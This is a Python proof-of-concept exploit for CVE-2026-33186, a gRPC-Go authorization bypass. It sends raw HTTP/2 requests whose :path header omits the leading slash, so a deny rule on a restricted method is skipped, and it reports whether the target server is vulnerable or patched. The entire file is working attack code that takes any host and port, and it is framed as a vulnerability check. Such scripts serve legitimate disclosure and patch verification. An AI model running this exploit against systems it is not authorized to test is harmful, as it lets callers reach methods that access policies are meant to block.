#!/usr/bin/env python3
"""
CVE-2026-33186 gRPC-Go authorization policy bypass via missing leading slash

Requirements:
    pip install h2       (pure-Python HTTP/2 implementation)
    Python >= 3.8

Usage:
    python3 poc.py [--host HOST] [--port PORT] [--service SVC] [--method MTH]
    python3 poc.py --help
"""

import argparse
import socket
import struct
import sys
import time

try:
    import h2.config
    import h2.connection
    import h2.events
except ImportError:
    print("[!] h2 library not found. Install with: pip install h2")
    sys.exit(1)


def encode_grpc_frame(data: bytes) -> bytes:
    """Encode payload as a gRPC data frame: 1-byte compressed flag + 4-byte length."""
    return b"\x00" + struct.pack(">I", len(data)) + data


def decode_grpc_frame(data: bytes) -> bytes:
    """Strip 5-byte gRPC data frame header and return payload."""
    if len(data) < 5:
        return data
    _compressed = data[0]
    _length = struct.unpack(">I", data[1:5])[0]
    return data[5:]


def decode_proto_string(data: bytes) -> str:
    """Decode field 1 (wire type 2) from a minimal protobuf message."""
    if len(data) < 2 or data[0] != 0x0A:  # field 1, wire type 2
        return f"<raw {len(data)} bytes: {data.hex()}>"
    length = data[1]
    if len(data) < 2 + length:
        return f"<truncated: {data!r}>"
    return data[2:2 + length].decode("utf-8", errors="replace")


def encode_proto_string(s: str) -> bytes:
    """Encode a string as field 1 (wire type 2) in a protobuf message."""
    encoded = s.encode("utf-8")
    length = len(encoded)
    # varint-encode the length (simple single-byte for short strings)
    assert length < 128, "use varint for longer strings"
    return bytes([0x0A, length]) + encoded


def send_grpc_call(host: str, port: int, path: str, payload: bytes, label: str) -> dict:
    """
    Send a single gRPC call using a raw HTTP/2 connection.

    path   -- the :path pseudo-header value to send (may or may not have leading /)
    payload -- serialized protobuf request body
    label  -- human-readable label for logging
    """
    print(f"\n{'='*60}")
    print(f"  Call: {label}")
    print(f"  :path header = {path!r}")
    print(f"{'='*60}")

    sock = socket.create_connection((host, port), timeout=5)

    config = h2.config.H2Configuration(
        client_side=True,
        header_encoding="utf-8",
    )
    conn = h2.connection.H2Connection(config=config)
    conn.initiate_connection()

    # Send connection preface
    data = conn.data_to_send(65535)
    sock.sendall(data)

    # Read server preface (SETTINGS frame)
    raw = sock.recv(65535)
    events = conn.receive_data(raw)
    for ev in events:
        if isinstance(ev, h2.events.SettingsAcknowledged):
            pass
        elif isinstance(ev, h2.events.WindowUpdated):
            pass

    # ACK server settings
    data = conn.data_to_send(65535)
    if data:
        sock.sendall(data)

    # Build gRPC request
    grpc_body = encode_grpc_frame(payload)

    # HEADERS frame with gRPC pseudo-headers
    # The key attack: :path does NOT start with '/'
    headers = [
        (":method",       "POST"),
        (":scheme",       "http"),
        (":path",         path),           # <-- attacker-controlled :path
        (":authority",    f"{host}:{port}"),
        ("content-type",  "application/grpc"),
        ("te",            "trailers"),
        ("grpc-encoding", "identity"),
        ("user-agent",    "poc-cve-2026-33186/1.0"),
    ]

    stream_id = conn.get_next_available_stream_id()
    conn.send_headers(stream_id, headers)
    data = conn.data_to_send(65535)
    sock.sendall(data)

    # DATA frame with END_STREAM
    conn.send_data(stream_id, grpc_body, end_stream=True)
    data = conn.data_to_send(65535)
    sock.sendall(data)

    # Read response
    result = {
        "grpc_status": None,
        "grpc_message": None,
        "response_body": None,
        "raw_body": b"",
    }

    deadline = time.time() + 5.0
    while time.time() < deadline:
        try:
            sock.settimeout(2.0)
            raw = sock.recv(65535)
        except socket.timeout:
            break
        if not raw:
            break

        events = conn.receive_data(raw)
        data = conn.data_to_send(65535)
        if data:
            sock.sendall(data)

        for ev in events:
            if isinstance(ev, h2.events.DataReceived):
                result["raw_body"] += ev.data
                conn.acknowledge_received_data(ev.flow_controlled_length, ev.stream_id)
                data = conn.data_to_send(65535)
                if data:
                    sock.sendall(data)
            elif isinstance(ev, h2.events.TrailersReceived):
                for name, value in ev.headers:
                    if name == "grpc-status":
                        result["grpc_status"] = int(value)
                    elif name == "grpc-message":
                        result["grpc_message"] = value
            elif isinstance(ev, h2.events.ResponseReceived):
                for name, value in ev.headers:
                    if name == "grpc-status":
                        result["grpc_status"] = int(value)
                    elif name == "grpc-message":
                        result["grpc_message"] = value
            elif isinstance(ev, h2.events.StreamEnded):
                deadline = 0  # done

    conn.close_connection()
    data = conn.data_to_send(65535)
    if data:
        try:
            sock.sendall(data)
        except Exception:
            pass
    sock.close()

    # Decode response body
    if result["raw_body"]:
        payload_bytes = decode_grpc_frame(result["raw_body"])
        result["response_body"] = decode_proto_string(payload_bytes)

    # Print result
    status = result["grpc_status"]
    status_names = {0: "OK", 1: "Cancelled", 2: "Unknown", 3: "InvalidArgument",
                    5: "NotFound", 7: "PermissionDenied", 12: "Unimplemented", 13: "Internal"}
    status_name = status_names.get(status, str(status))

    print(f"  gRPC status:  {status} ({status_name})")
    if result["grpc_message"]:
        print(f"  gRPC message: {result['grpc_message']}")
    if result["response_body"]:
        print(f"  Response:     {result['response_body']}")

    return result


def main():
    parser = argparse.ArgumentParser(
        description="CVE-2026-33186 PoC -- gRPC-Go authz bypass via :path without leading slash",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python3 poc.py\n"
            "  python3 poc.py --host 10.0.0.5 --port 50051\n"
            "  python3 poc.py --service MyService --method SecretMethod\n"
            "\n"
            "The PoC runs three calls to isolate the bypass:\n"
            "  BASELINE -- canonical :path with slash, expect PermissionDenied (7)\n"
            "  ATTACK   -- :path without slash, expect OK (0) on vulnerable server\n"
            "  CONTROL  -- public method with slash, expect OK (0)\n"
            "\n"
            "Exit codes: 0=vulnerable, 1=patched, 2=error\n"
            "Requires: pip install h2"
        ),
    )
    parser.add_argument("--host", default="127.0.0.1",
                        help="gRPC server host (default: 127.0.0.1)")
    parser.add_argument("--port", type=int, default=50051,
                        help="gRPC server port (default: 50051)")
    parser.add_argument("--service", default="TestService",
                        help="gRPC service name to target (default: TestService)")
    parser.add_argument("--method", default="AdminMethod",
                        help="gRPC method name to bypass (default: AdminMethod)")
    parser.add_argument("--public-method", default="PublicMethod", dest="public_method",
                        help="method name for control call (default: PublicMethod)")
    args = parser.parse_args()

    admin_path  = f"/{args.service}/{args.method}"
    attack_path = f"{args.service}/{args.method}"
    public_path = f"/{args.service}/{args.public_method}"

    print()
    print("CVE-2026-33186 -- gRPC-Go Authorization Policy Bypass")
    print("Affected: google.golang.org/grpc < v1.79.3")
    print("Fixed in: v1.79.3 (PR #8981, 2026-03-17)")
    print()
    print(f"Target: {args.host}:{args.port}")
    print()
    print("Policy under test:")
    print(f"  DENY  {admin_path}    <- deny rule (with slash)")
    print(f"  ALLOW {public_path}")
    print("  ALLOW * (default)")

    # Protobuf request: field 1 = "poc"
    req_payload = encode_proto_string("poc")

    # -----------------------------------------------------------------------
    # Test 1: Normal path WITH leading slash -> should be DENIED (status 7)
    # -----------------------------------------------------------------------
    r1 = send_grpc_call(
        args.host, args.port,
        path=admin_path,
        payload=req_payload,
        label=f"BASELINE: {admin_path} (WITH slash) -- expect DENIED",
    )

    # -----------------------------------------------------------------------
    # Test 2: Bypass path WITHOUT leading slash -> should bypass deny rule
    # -----------------------------------------------------------------------
    r2 = send_grpc_call(
        args.host, args.port,
        path=attack_path,
        payload=req_payload,
        label=f"ATTACK:   {attack_path} (NO slash) -- expect BYPASS",
    )

    # -----------------------------------------------------------------------
    # Test 3: Public method (control -- should always succeed)
    # -----------------------------------------------------------------------
    r3 = send_grpc_call(
        args.host, args.port,
        path=public_path,
        payload=req_payload,
        label=f"CONTROL:  {public_path} (WITH slash) -- expect OK",
    )

    # -----------------------------------------------------------------------
    # Summary
    # -----------------------------------------------------------------------
    print()
    print("=" * 60)
    print("SUMMARY")
    print("=" * 60)

    baseline_denied  = r1["grpc_status"] == 7
    bypass_succeeded = r2["grpc_status"] == 0
    public_ok        = r3["grpc_status"] == 0

    print(f"  Baseline {admin_path} (with slash):  status={r1['grpc_status']}  "
          f"{'DENIED (correct)' if baseline_denied else 'UNEXPECTED'}")
    print(f"  Attack   {attack_path} (no slash):    status={r2['grpc_status']}  "
          f"{'BYPASS CONFIRMED' if bypass_succeeded else 'not bypassed'}")
    print(f"  Control  {public_path}:              status={r3['grpc_status']}  "
          f"{'OK (correct)' if public_ok else 'UNEXPECTED'}")
    print()

    if baseline_denied and bypass_succeeded:
        print("  [VULNERABLE] CVE-2026-33186 confirmed on this server.")
        print("  The deny rule is enforced for normal clients but bypassed")
        print("  by omitting the leading slash from the :path header.")
        sys.exit(0)
    elif not baseline_denied:
        print(f"  [ERROR] Baseline not denied (status={r1['grpc_status']}).")
        print("  Check that the server is running and authz policy is configured.")
        sys.exit(2)
    else:
        print(f"  [PATCHED] Bypass returned status={r2['grpc_status']}.")
        print("  This server may be running grpc-go >= v1.79.3 (patched).")
        sys.exit(1)


if __name__ == "__main__":
    main()
